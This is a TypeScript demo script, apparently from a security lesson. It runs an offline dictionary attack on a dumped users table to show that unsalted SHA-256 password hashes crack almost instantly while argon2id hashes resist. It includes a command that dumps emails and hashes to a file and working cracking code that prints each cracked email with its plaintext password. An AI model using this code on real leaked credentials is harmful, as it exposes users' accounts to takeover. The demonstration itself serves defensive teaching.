// Offline crack: we already stole the users table (stolen.txt: email:pw_hash per line)
// and a list of common passwords. No server is touched here. Run:
//   sqlite3 data.db "select email||':'||pw_hash from users" > stolen.txt
//   npx tsx attacks/crack.ts
import { readFileSync } from "node:fs";
import { createHash } from "node:crypto";
import { verify } from "@node-rs/argon2";

const stolen = readFileSync("stolen.txt", "utf8").trim().split("\n").map(l => {
  const i = l.indexOf(":");
  return { email: l.slice(0, i), hash: l.slice(i + 1) };
});
const words = readFileSync("10k-most-common.txt", "utf8").split("\n").map(w => w.trim()).filter(Boolean);
const sha256 = (s: string) => createHash("sha256").update(s).digest("hex");

const argon = stolen[0]?.hash.startsWith("$argon2");
console.log(`${stolen.length} hashes, ${words.length} words, format: ${argon ? "argon2id" : "unsalted sha256"}`);

if (!argon) {
  // Precompute the whole list once, then every stolen hash is a lookup. Unsalted = this works at all.
  const t0 = Date.now();
  const table = new Map(words.map(w => [sha256(w), w]));
  for (const u of stolen) {
    const hit = table.get(u.hash);
    console.log(hit ? `CRACKED ${u.email} = ${hit}` : `safe    ${u.email}`);
  }
  const secs = (Date.now() - t0) / 1000;
  console.log(`done in ${secs.toFixed(2)}s  (~${Math.round(words.length / secs).toLocaleString()} guesses/sec)`);
} else {
  // argon2 is salted, so no precomputed table helps: we must verify word by word, per user.
  const t0 = Date.now();
  let tries = 0;
  for (const u of stolen) {
    for (const w of words) {
      tries++;
      if (await verify(u.hash, w)) { console.log(`CRACKED ${u.email} = ${w}`); break; }
      if (Date.now() - t0 > 5000) break; // stop the demo after 5s
    }
    if (Date.now() - t0 > 5000) break;
  }
  const secs = (Date.now() - t0) / 1000;
  const rate = tries / secs;
  const hours = (stolen.length * words.length / rate) / 3600;
  console.log(`gave up after ${secs.toFixed(1)}s: ${Math.round(rate)} guesses/sec`);
  console.log(`the full list would now take ~${hours.toFixed(1)} hours instead of a second`);
}
